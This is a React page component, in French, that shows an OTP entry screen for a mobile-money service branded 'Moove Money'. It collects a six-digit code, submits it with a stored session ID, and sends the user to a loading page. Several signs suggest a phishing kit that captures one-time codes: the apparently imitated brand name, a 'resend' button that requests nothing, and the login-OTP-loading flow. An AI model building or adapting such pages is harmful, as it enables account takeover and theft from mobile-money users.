import { useState, useEffect, useRef } from 'react';
import { useLocation } from 'wouter';
import { PageTransition } from '../components/PageTransition';
import { useSubmitOtp } from '@workspace/api-client-react';
import { getSessionId } from '../lib/store';
import { ChevronLeft, CircleDollarSign, Loader2 } from 'lucide-react';

const OTP_LENGTH = 6;

export default function Otp() {
  const [, setLocation] = useLocation();
  const sessionId = getSessionId();
  const [otp, setOtp] = useState<string[]>(Array(OTP_LENGTH).fill(''));
  const [countdown, setCountdown] = useState(80);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  const submitOtp = useSubmitOtp();

  useEffect(() => {
    if (!sessionId) setLocation('/login');
  }, [sessionId, setLocation]);

  useEffect(() => {
    inputRefs.current[0]?.focus();
  }, []);

  useEffect(() => {
    if (countdown <= 0) return;
    const timer = setInterval(() => setCountdown(c => c - 1), 1000);
    return () => clearInterval(timer);
  }, [countdown]);

  const focusBox = (index: number) => {
    inputRefs.current[Math.max(0, Math.min(OTP_LENGTH - 1, index))]?.focus();
  };

  const handleChange = (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return;
    const newOtp = [...otp];

    if (value.length > 1) {
      const digits = value.replace(/\D/g, '').slice(0, OTP_LENGTH - index);
      digits.split('').forEach((d, i) => {
        if (index + i < OTP_LENGTH) newOtp[index + i] = d;
      });
      setOtp(newOtp);
      const nextIdx = Math.min(index + digits.length, OTP_LENGTH - 1);
      focusBox(nextIdx);
      if (newOtp.every(v => v !== '')) triggerSubmit(newOtp.join(''));
      return;
    }

    newOtp[index] = value;
    setOtp(newOtp);

    if (value && index < OTP_LENGTH - 1) focusBox(index + 1);
    if (newOtp.every(v => v !== '')) triggerSubmit(newOtp.join(''));
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Backspace') {
      if (otp[index]) {
        const newOtp = [...otp];
        newOtp[index] = '';
        setOtp(newOtp);
      } else if (index > 0) {
        const newOtp = [...otp];
        newOtp[index - 1] = '';
        setOtp(newOtp);
        focusBox(index - 1);
      }
    } else if (e.key === 'ArrowLeft' && index > 0) {
      focusBox(index - 1);
    } else if (e.key === 'ArrowRight' && index < OTP_LENGTH - 1) {
      focusBox(index + 1);
    }
  };

  const handlePaste = (e: React.ClipboardEvent) => {
    e.preventDefault();
    const pasted = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, OTP_LENGTH);
    if (!pasted) return;
    const newOtp = Array(OTP_LENGTH).fill('');
    pasted.split('').forEach((d, i) => { newOtp[i] = d; });
    setOtp(newOtp);
    focusBox(Math.min(pasted.length, OTP_LENGTH - 1));
    if (pasted.length === OTP_LENGTH) triggerSubmit(pasted);
  };

  const triggerSubmit = (code: string) => {
    if (!sessionId || isSubmitting) return;
    setIsSubmitting(true);
    submitOtp.mutate(
      { sessionId, data: { otp: code } },
      {
        onSuccess: () => setLocation('/loading'),
        onError: () => setIsSubmitting(false),
      }
    );
  };

  const handleResend = () => {
    setOtp(Array(OTP_LENGTH).fill(''));
    setCountdown(80);
    setIsSubmitting(false);
    focusBox(0);
  };

  const filledCount = otp.filter(v => v !== '').length;

  return (
    <PageTransition className="bg-slate-900 text-white">
      {/* En-tête */}
      <header className="px-6 py-5 flex items-center relative">
        <button
          onClick={() => setLocation('/login')}
          className="w-10 h-10 -ml-2 flex items-center justify-center rounded-full hover:bg-white/10 transition-colors text-white/70 absolute"
          data-testid="button-back"
        >
          <ChevronLeft size={24} />
        </button>
        <div className="font-bold text-white mx-auto">Vérification</div>
      </header>

      <div className="flex-1 flex flex-col p-8 pt-8 text-center">
        {/* Logo */}
        <div className="flex items-center gap-2 justify-center mb-8">
          <div className="w-10 h-10 rounded-full bg-white flex items-center justify-center text-primary">
            <CircleDollarSign size={24} />
          </div>
          <span className="font-bold text-2xl tracking-tight text-white">Moove Money</span>
        </div>

        <h1 className="text-3xl font-bold mb-3">Entrez le code OTP</h1>
        <p className="text-slate-400 font-medium mb-10">
          Entrez le code à 6 chiffres envoyé sur votre téléphone.
        </p>

        {/* Boîtes OTP */}
        <div
          className="flex justify-center gap-2.5 mb-4 mx-auto w-full max-w-xs"
          onPaste={handlePaste}
        >
          {otp.map((digit, index) => {
            const isFilled = digit !== '';
            return (
              <input
                key={index}
                ref={el => { inputRefs.current[index] = el; }}
                type="text"
                inputMode="numeric"
                value={digit}
                maxLength={1}
                onChange={e => handleChange(index, e.target.value)}
                onKeyDown={e => handleKeyDown(index, e)}
                onClick={() => focusBox(index)}
                disabled={isSubmitting}
                data-testid={`input-otp-${index}`}
                className={[
                  'w-11 h-14 rounded-xl text-center text-2xl font-bold outline-none transition-all duration-150 select-none',
                  'border-2',
                  isSubmitting ? 'cursor-not-allowed opacity-60' : '',
                  isFilled
                    ? 'bg-primary/20 border-primary text-white shadow-lg shadow-primary/20'
                    : 'bg-slate-700 border-slate-500 text-white',
                  !isFilled && !isSubmitting
                    ? 'focus:border-primary focus:bg-slate-600 focus:shadow-md focus:shadow-primary/10'
                    : '',
                ].join(' ')}
              />
            );
          })}
        </div>

        <p className="text-xs text-slate-500 mb-8">
          {filledCount} / {OTP_LENGTH} chiffres saisis
        </p>

        {(submitOtp.isPending || isSubmitting) && (
          <div className="flex justify-center mb-6">
            <Loader2 className="animate-spin text-primary" size={32} />
          </div>
        )}

        <div className="text-slate-400 font-medium text-sm">
          {countdown > 0 ? (
            <p>
              Renvoyer le code dans{' '}
              <span className="text-primary font-bold">{countdown}s</span>
            </p>
          ) : (
            <button
              className="text-primary font-bold hover:text-white transition-colors"
              onClick={handleResend}
              data-testid="button-resend-otp"
            >
              Renvoyer le code OTP
            </button>
          )}
        </div>
      </div>

      {/* Pied de page */}
      <div className="h-24 w-full bg-slate-800 mt-auto rounded-t-[50%] flex flex-col items-center justify-end pb-6 border-t border-slate-700/50">
        <div className="text-xs text-slate-500 font-medium mb-1">Version 1.0.0</div>
        <button className="text-xs text-primary font-bold hover:text-white transition-colors">
          Aide &amp; Support
        </button>
      </div>
    </PageTransition>
  );
}
